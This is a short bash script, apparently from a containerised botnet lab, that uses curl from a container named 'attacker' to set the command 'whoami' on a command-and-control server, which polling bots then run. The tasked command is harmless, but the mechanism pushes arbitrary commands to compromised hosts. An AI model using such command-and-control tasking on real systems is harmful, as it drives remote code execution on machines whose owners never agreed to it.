#!/bin/bash

docker exec attacker curl http://172.18.0.2:9000/set/whoami
echo ""
echo "Command 'whoami' set. Bots will execute it on next poll."